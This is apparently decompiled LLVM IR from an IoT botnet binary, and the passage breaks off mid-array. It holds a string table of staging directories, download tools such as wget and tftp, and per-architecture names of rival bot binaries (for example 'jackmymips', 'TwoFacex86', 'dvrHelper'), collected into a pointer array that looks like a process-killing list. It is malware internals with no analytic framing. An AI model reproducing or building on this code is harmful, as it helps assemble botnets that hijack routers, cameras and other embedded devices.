@global_var_26638.553 = constant [6 x i8] c"/var/\00"
@global_var_26640.554 = constant [6 x i8] c"/dev/\00"
@global_var_26648.555 = constant [10 x i8] c"/var/run/\00"
@global_var_26654.556 = constant [10 x i8] c"/dev/shm/\00"
@global_var_26660.557 = constant [6 x i8] c"/mnt/\00"
@global_var_26668.558 = constant [7 x i8] c"/boot/\00"
@global_var_26670.559 = constant [6 x i8] c"/usr/\00"
@global_var_259e4.571 = constant [5 x i8] c"wget\00"
@global_var_259ec.572 = constant [6 x i8] c"armv*\00"
@global_var_24d28.573 = constant [5 x i8] c"bot*\00"
@global_var_259f4.574 = constant [6 x i8] c"ntpd*\00"
@global_var_24d3c.575 = constant [7 x i8] c"hackz*\00"
@global_var_259fc.576 = constant [8 x i8] c"shitty*\00"
@global_var_25a04.577 = constant [6 x i8] c"jack*\00"
@global_var_24d00.578 = constant [6 x i8] c"mips*\00"
@global_var_24ce0.579 = constant [5 x i8] c"sex*\00"
@global_var_25a0c.580 = constant [4 x i8] c"i86\00"
@global_var_25a10.581 = constant [5 x i8] c"ssh*\00"
@global_var_24d20.582 = constant [5 x i8] c"sh4*\00"
@global_var_24d30.583 = constant [11 x i8] c"jackmeoff*\00"
@global_var_24ce8.584 = constant [6 x i8] c"tftp*\00"
@global_var_25a18.585 = constant [4 x i8] c"i56\00"
@global_var_25a1c.586 = constant [5 x i8] c"mips\00"
@global_var_25a24.587 = constant [7 x i8] c"mipsel\00"
@global_var_25a2c.588 = constant [4 x i8] c"sh4\00"
@global_var_25a30.589 = constant [4 x i8] c"x86\00"
@global_var_25a34.590 = constant [5 x i8] c"i686\00"
@global_var_25a3c.591 = constant [4 x i8] c"ppc\00"
@global_var_25a40.592 = constant [5 x i8] c"i586\00"
@global_var_25a48.593 = constant [7 x i8] c"mips64\00"
@global_var_25a50.594 = constant [6 x i8] c"sh2eb\00"
@global_var_25a58.595 = constant [7 x i8] c"sh2elf\00"
@global_var_25a60.596 = constant [4 x i8] c"arm\00"
@global_var_25a64.597 = constant [6 x i8] c"armv5\00"
@global_var_25a6c.598 = constant [8 x i8] c"armv4tl\00"
@global_var_25a74.599 = constant [6 x i8] c"armv4\00"
@global_var_25a7c.600 = constant [6 x i8] c"armv6\00"
@global_var_25a84.601 = constant [8 x i8] c"powerpc\00"
@global_var_25a8c.602 = constant [13 x i8] c"powerpc440fp\00"
@global_var_25a9c.603 = constant [5 x i8] c"m68k\00"
@global_var_25aa4.604 = constant [6 x i8] c"sparc\00"
@global_var_25aac.605 = constant [7 x i8] c"x86_64\00"
@global_var_25ab4.606 = constant [11 x i8] c"jackmymips\00"
@global_var_25ac0.607 = constant [13 x i8] c"jackmymips64\00"
@global_var_25ad0.608 = constant [13 x i8] c"jackmymipsel\00"
@global_var_25ae0.609 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_25aec.610 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_25afc.611 = constant [10 x i8] c"jackmysh4\00"
@global_var_25b08.612 = constant [10 x i8] c"jackmyx86\00"
@global_var_25b14.613 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_25b20.614 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_25b30.615 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_25b3c.616 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_25b48.617 = constant [11 x i8] c"jackmyi686\00"
@global_var_25b54.618 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_25b64.619 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_25b78.620 = constant [11 x i8] c"jackmyi586\00"
@global_var_25b84.621 = constant [11 x i8] c"jackmym68k\00"
@global_var_25b90.622 = constant [12 x i8] c"jackmysparc\00"
@global_var_25b9c.623 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_25bac.624 = constant [11 x i8] c"hackmymips\00"
@global_var_25bb8.625 = constant [13 x i8] c"hackmymips64\00"
@global_var_25bc8.626 = constant [13 x i8] c"hackmymipsel\00"
@global_var_25bd8.627 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_25be4.628 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_25bf4.629 = constant [10 x i8] c"hackmysh4\00"
@global_var_25c00.630 = constant [10 x i8] c"hackmyx86\00"
@global_var_25c0c.631 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_25c18.632 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_25c28.633 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_25c34.634 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_25c40.635 = constant [11 x i8] c"hackmyi686\00"
@global_var_25c4c.636 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_25c5c.637 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_25c70.638 = constant [11 x i8] c"hackmyi586\00"
@global_var_25c7c.639 = constant [11 x i8] c"hackmym68k\00"
@global_var_25c88.640 = constant [12 x i8] c"hackmysparc\00"
@global_var_25c94.641 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_25ca4.642 = constant [3 x i8] c"b1\00"
@global_var_25ca8.643 = constant [3 x i8] c"b2\00"
@global_var_25cac.644 = constant [3 x i8] c"b3\00"
@global_var_25cb0.645 = constant [3 x i8] c"b4\00"
@global_var_25cb4.646 = constant [3 x i8] c"b5\00"
@global_var_25cb8.647 = constant [3 x i8] c"b6\00"
@global_var_25cbc.648 = constant [3 x i8] c"b7\00"
@global_var_25cc0.649 = constant [3 x i8] c"b8\00"
@global_var_25cc4.650 = constant [3 x i8] c"b9\00"
@global_var_25cc8.651 = constant [4 x i8] c"b10\00"
@global_var_25ccc.652 = constant [4 x i8] c"b11\00"
@global_var_25cd0.653 = constant [4 x i8] c"b12\00"
@global_var_25cd4.654 = constant [4 x i8] c"b13\00"
@global_var_25cd8.655 = constant [4 x i8] c"b14\00"
@global_var_25cdc.656 = constant [4 x i8] c"b15\00"
@global_var_25ce0.657 = constant [4 x i8] c"b16\00"
@global_var_25ce4.658 = constant [4 x i8] c"b17\00"
@global_var_25ce8.659 = constant [4 x i8] c"b18\00"
@global_var_25cec.660 = constant [4 x i8] c"b19\00"
@global_var_25cf0.661 = constant [4 x i8] c"b20\00"
@global_var_25cf4.662 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_25d08.663 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_25d14.664 = constant [10 x i8] c"dvrHelper\00"
@global_var_25d20.665 = constant [8 x i8] c"FDFDHFC\00"
@global_var_25d28.666 = constant [5 x i8] c"FEUB\00"
@global_var_25d30.667 = constant [9 x i8] c"FTUdftui\00"
@global_var_25d3c.668 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_25d48.669 = constant [6 x i8] c"jhUOH\00"
@global_var_25d50.670 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_25d5c.671 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_25d68.672 = constant [8 x i8] c"kmymips\00"
@global_var_25d70.673 = constant [10 x i8] c"kmymips64\00"
@global_var_25d7c.674 = constant [10 x i8] c"kmymipsel\00"
@global_var_25d88.675 = constant [9 x i8] c"kmysh2eb\00"
@global_var_25d94.676 = constant [10 x i8] c"kmysh2elf\00"
@global_var_25da0.677 = constant [7 x i8] c"kmysh4\00"
@global_var_25da8.678 = constant [7 x i8] c"kmyx86\00"
@global_var_25db0.679 = constant [9 x i8] c"kmyarmv5\00"
@global_var_25dbc.680 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_25dc8.681 = constant [9 x i8] c"kmyarmv4\00"
@global_var_25dd4.682 = constant [9 x i8] c"kmyarmv6\00"
@global_var_25de0.683 = constant [8 x i8] c"kmyi686\00"
@global_var_25de8.684 = constant [11 x i8] c"kmypowerpc\00"
@global_var_25df4.685 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_25e04.686 = constant [8 x i8] c"kmyi586\00"
@global_var_25e0c.687 = constant [8 x i8] c"kmym68k\00"
@global_var_25e14.688 = constant [9 x i8] c"kmysparc\00"
@global_var_25e20.689 = constant [10 x i8] c"kmyx86_64\00"
@global_var_25e2c.690 = constant [8 x i8] c"lolmips\00"
@global_var_25e34.691 = constant [10 x i8] c"lolmips64\00"
@global_var_25e40.692 = constant [10 x i8] c"lolmipsel\00"
@global_var_25e4c.693 = constant [9 x i8] c"lolsh2eb\00"
@global_var_25e58.694 = constant [10 x i8] c"lolsh2elf\00"
@global_var_25e64.695 = constant [7 x i8] c"lolsh4\00"
@global_var_25e6c.696 = constant [7 x i8] c"lolx86\00"
@global_var_25e74.697 = constant [9 x i8] c"lolarmv5\00"
@global_var_25e80.698 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_25e8c.699 = constant [9 x i8] c"lolarmv4\00"
@global_var_25e98.700 = constant [9 x i8] c"lolarmv6\00"
@global_var_25ea4.701 = constant [8 x i8] c"loli686\00"
@global_var_25eac.702 = constant [11 x i8] c"lolpowerpc\00"
@global_var_25eb8.703 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_25ec8.704 = constant [8 x i8] c"loli586\00"
@global_var_25ed0.705 = constant [8 x i8] c"lolm68k\00"
@global_var_25ed8.706 = constant [9 x i8] c"lolsparc\00"
@global_var_25ee4.707 = constant [8 x i8] c"RYrydry\00"
@global_var_25eec.708 = constant [8 x i8] c"telmips\00"
@global_var_25ef4.709 = constant [10 x i8] c"telmips64\00"
@global_var_25f00.710 = constant [10 x i8] c"telmipsel\00"
@global_var_25f0c.711 = constant [9 x i8] c"telsh2eb\00"
@global_var_25f18.712 = constant [10 x i8] c"telsh2elf\00"
@global_var_25f24.713 = constant [7 x i8] c"telsh4\00"
@global_var_25f2c.714 = constant [7 x i8] c"telx86\00"
@global_var_25f34.715 = constant [9 x i8] c"telarmv5\00"
@global_var_25f40.716 = constant [11 x i8] c"telarmv4tl\00"
@global_var_25f4c.717 = constant [9 x i8] c"telarmv4\00"
@global_var_25f58.718 = constant [9 x i8] c"telarmv6\00"
@global_var_25f64.719 = constant [8 x i8] c"teli686\00"
@global_var_25f6c.720 = constant [11 x i8] c"telpowerpc\00"
@global_var_25f78.721 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_25f88.722 = constant [8 x i8] c"teli586\00"
@global_var_25f90.723 = constant [8 x i8] c"telm68k\00"
@global_var_25f98.724 = constant [9 x i8] c"telsparc\00"
@global_var_25fa4.725 = constant [10 x i8] c"telx86_64\00"
@global_var_25fb0.726 = constant [12 x i8] c"TwoFacemips\00"
@global_var_25fbc.727 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_25fcc.728 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_25fdc.729 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_25fec.730 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_25ffc.731 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_26008.732 = constant [11 x i8] c"TwoFacex86\00"
@global_var_26014.733 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_26024.734 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_26034.735 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_26044.736 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_26054.737 = constant [12 x i8] c"TwoFacei686\00"
@global_var_26060.738 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_26070.739 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_26084.740 = constant [12 x i8] c"TwoFacei586\00"
@global_var_26090.741 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_2609c.742 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_260ac.743 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_260bc.744 = constant [9 x i8] c"UYyuyioy\00"
@global_var_260c8.745 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_260d4.746 = constant [5 x i8] c"xxb1\00"
@global_var_260dc.747 = constant [5 x i8] c"xxb2\00"
@global_var_260e4.748 = constant [5 x i8] c"xxb3\00"
@global_var_260ec.749 = constant [5 x i8] c"xxb4\00"
@global_var_260f4.750 = constant [5 x i8] c"xxb5\00"
@global_var_260fc.751 = constant [5 x i8] c"xxb6\00"
@global_var_26104.752 = constant [5 x i8] c"xxb7\00"
@global_var_2610c.753 = constant [5 x i8] c"xxb8\00"
@global_var_26114.754 = constant [5 x i8] c"xxb9\00"
@global_var_2611c.755 = constant [6 x i8] c"xxb10\00"
@global_var_26124.756 = constant [6 x i8] c"xxb11\00"
@global_var_2612c.757 = constant [6 x i8] c"xxb12\00"
@global_var_26134.758 = constant [6 x i8] c"xxb13\00"
@global_var_2613c.759 = constant [6 x i8] c"xxb14\00"
@global_var_26144.760 = constant [6 x i8] c"xxb15\00"
@global_var_2614c.761 = constant [6 x i8] c"xxb16\00"
@global_var_26154.762 = constant [6 x i8] c"xxb17\00"
@global_var_2615c.763 = constant [6 x i8] c"xxb18\00"
@global_var_26164.764 = constant [6 x i8] c"xxb19\00"
@global_var_2616c.765 = constant [6 x i8] c"xxb20\00"
@global_var_26174.766 = constant i32 49
@global_var_26178.767 = constant i32 50
@global_var_2617c.768 = constant i32 51
@global_var_26180.769 = constant i32 52
@global_var_26184.770 = constant i32 53
@global_var_26188.771 = constant i32 54
@global_var_2618c.772 = constant i32 55
@global_var_26190.773 = constant i32 56
@global_var_26194.774 = constant i32 57
@global_var_26198.775 = constant [3 x i8] c"10\00"
@global_var_2619c.776 = constant [3 x i8] c"11\00"
@global_var_261a0.777 = constant [3 x i8] c"12\00"
@global_var_261a4.778 = constant [3 x i8] c"13\00"
@global_var_261a8.779 = constant [3 x i8] c"14\00"
@global_var_261ac.780 = constant [3 x i8] c"15\00"
@global_var_261b0.781 = constant [3 x i8] c"16\00"
@global_var_261b4.782 = constant [3 x i8] c"17\00"
@global_var_261b8.783 = constant [3 x i8] c"18\00"
@global_var_261bc.784 = constant [3 x i8] c"19\00"
@global_var_261c0.785 = constant [3 x i8] c"20\00"
@global_var_261c4.786 = constant [3 x i8] c"bb\00"
@global_var_261c8.787 = constant [11 x i8] c"busybotnet\00"
@global_var_261d4.788 = constant [5 x i8] c"pppd\00"
@global_var_261dc.789 = constant [6 x i8] c"pppoe\00"
@global_var_261e4.790 = constant [5 x i8] c"wput\00"
@global_var_261ec.791 = constant [3 x i8] c"B1\00"
@global_var_261f0.792 = constant [3 x i8] c"B2\00"
@global_var_261f4.793 = constant [3 x i8] c"B3\00"
@global_var_261f8.794 = constant [3 x i8] c"B4\00"
@global_var_261fc.795 = constant [3 x i8] c"B5\00"
@global_var_26200.796 = constant [3 x i8] c"B6\00"
@global_var_26204.797 = constant [3 x i8] c"B7\00"
@global_var_26208.798 = constant [3 x i8] c"B8\00"
@global_var_2620c.799 = constant [3 x i8] c"B9\00"
@global_var_26210.800 = constant [4 x i8] c"B10\00"
@global_var_26214.801 = constant [4 x i8] c"B11\00"
@global_var_26218.802 = constant [4 x i8] c"B12\00"
@global_var_2621c.803 = constant [4 x i8] c"B13\00"
@global_var_26220.804 = constant [4 x i8] c"B14\00"
@global_var_26224.805 = constant [4 x i8] c"B15\00"
@global_var_26228.806 = constant [4 x i8] c"B16\00"
@global_var_2622c.807 = constant [4 x i8] c"B17\00"
@global_var_26230.808 = constant [4 x i8] c"B18\00"
@global_var_26234.809 = constant [4 x i8] c"B20\00"
@global_var_26238.810 = constant [10 x i8] c"dvrhelper\00"
@global_var_26244.811 = constant [247 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_259e4.571, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_259ec.572, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24d28.573, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_259f4.574, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_24d3c.575, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_259fc.576, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25a04.577, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_24d00.578, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24ce0.579, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25a0c.580, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25a10.581, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24d20.582, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_24d30.583, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_24ce8.584, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25a18.585, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25a1c.586, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25a24.587, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25a2c.588, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25a30.589, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25a34.590, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25a3c.591, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25a40.592, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25a1c.586, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25a48.593, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25a24.587, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25a50.594, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25a58.595, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25a2c.588, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25a30.589, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25a60.596, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25a64.597, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25a6c.598, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25a74.599, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25a7c.600, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25a34.590, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25a84.601, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25a8c.602, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25a40.592, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25a9c.603, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25aa4.604, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25aac.605, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25ab4.606, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25ac0.607, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25ad0.608, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25ae0.609, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25aec.610, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25afc.611, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25b08.612, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25b14.613, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_25b20.614, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25b30.615, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25b3c.616, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25b48.617, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_25b54.618, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_25b64.619, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25b78.620, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25b84.621, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25b90.622, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25b9c.623, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25bac.624, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25bb8.625, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25bc8.626, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25bd8.627, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25be4.628, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25bf4.629, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25c00.630, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25c0c.631, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_25c18.632, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25c28.633, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25c34.634, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25c40.635, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_25c4c.636, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_25c5c.637, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25c70.638, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25c7c.639, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25c88.640, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25c94.641, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25ca4.642, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25ca8.643, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25cac.644, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25cb0.645, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25cb4.646, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25cb8.647, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25cbc.648, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25cc0.649, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25cc4.650, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25cc8.651, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25ccc.652, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25cd0.653, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25cd4.654, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25cd8.655, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25cdc.656, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25ce0.657, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25ce4.658, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25ce8.659, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25cec.660, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25cf0.661, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_25cf4.662, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25d08.663, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25d14.664, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25d20.665, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25d28.666, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25d30.667, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25d3c.668, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25d48.669, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25d50.670, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25d5c.671, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25d68.672, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25d70.673, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25d7c.674, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25d88.675, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25d94.676, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25da0.677, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25da8.678, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25db0.679, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25dbc.680, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25dc8.681, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25dd4.682, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25de0.683, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25de8.684, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_25df4.685, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25e04.686, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25e0c.687, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25e14.688, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25e20.689, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25e2c.690, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25e34.691, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25e40.692, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25e4c.693, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25e58.694, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25e64.695, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25e6c.696, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25e74.697, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25e80.698, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25e8c.699, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25e98.700, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25ea4.701, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25eac.702, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_25eb8.703, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25ec8.704, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25ed0.705, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25ed8.706, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25ee4.707, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25eec.708, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25ef4.709, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* 